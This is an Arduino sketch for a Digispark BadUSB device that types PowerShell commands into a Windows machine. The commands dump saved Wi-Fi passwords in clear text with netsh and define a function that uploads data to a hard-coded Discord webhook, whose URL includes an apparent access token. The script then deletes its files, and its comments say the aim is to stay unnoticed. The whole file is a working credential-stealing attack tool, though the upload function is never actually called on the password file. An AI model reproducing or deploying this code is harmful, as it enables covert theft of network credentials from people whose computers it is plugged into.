#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd c:\\Windows\\Temp"); //Jumping to temporary dir
  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temp
  //upload sectioon 
DigiKeyboard.println("function Upload-Discord {");

DigiKeyboard.println("[CmdletBinding()]");
DigiKeyboard.println("param (");
DigiKeyboard.println("    [parameter(Position=0,Mandatory=$False)]");
DigiKeyboard.println("    [string]$file,");
DigiKeyboard.println("    [parameter(Position=1,Mandatory=$False)]");
DigiKeyboard.println("    [string]$text ");
DigiKeyboard.println(")");

DigiKeyboard.println("$hookurl = \"https://discord.com/api/webhooks/1062792783187935373/F1rY5dzjH0mGrkO11IV-JJ_nCmTjueYMGoZj8aNXNuspLpO3yvYUsn21UBEdqh2HP8Tt%22%22\"");
DigiKeyboard.println("$Body = @{");
DigiKeyboard.println("  'username' = $env:username");
DigiKeyboard.println("  'content' = $text");
DigiKeyboard.println("}");

DigiKeyboard.println("if (-not ([string]::IsNullOrEmpty($text))){");
DigiKeyboard.println("Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};");

DigiKeyboard.println("if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F \"file1=@$file\" $hookurl}");
DigiKeyboard.println("}");




  //end upload

  DigiKeyboard.delay(1000); 
  DigiKeyboard.println("Get-ChildItem -Path C:\\Windows\\Temp -Include *Wi-fi-* -File -Recurse | foreach { $_.Delete()}"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  //DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}

